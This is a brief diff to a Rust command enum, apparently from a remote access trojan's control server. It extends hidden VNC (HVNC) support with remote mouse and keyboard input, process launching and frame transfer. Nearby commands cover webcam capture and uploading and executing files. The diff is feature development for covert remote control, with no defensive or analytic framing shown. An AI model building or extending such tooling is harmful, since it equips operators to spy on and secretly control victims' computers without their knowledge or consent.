@@ -89,10 +89,12 @@ pub enum ServerCommand {
     RequestWebcam(SocketAddr),
     WebcamResult(SocketAddr, Vec<u8>),
 
-    StartHVNC(SocketAddr),
+    StartHVNC(SocketAddr, HVNCConfig),
     StopHVNC(SocketAddr),
-    OpenExplorer(SocketAddr),
-    HVNCFrame(SocketAddr, Vec<u8>),
+    HVNCMouseClick(SocketAddr, MouseClickData),
+    HVNCKeyboardInput(SocketAddr, KeyboardInputData),
+    HVNCStartProcess(SocketAddr, String),
+    HVNCFrame(SocketAddr, HVNCFrame),
   
     UploadAndExecute(SocketAddr, FileData),
     ExecuteFile(SocketAddr, String),
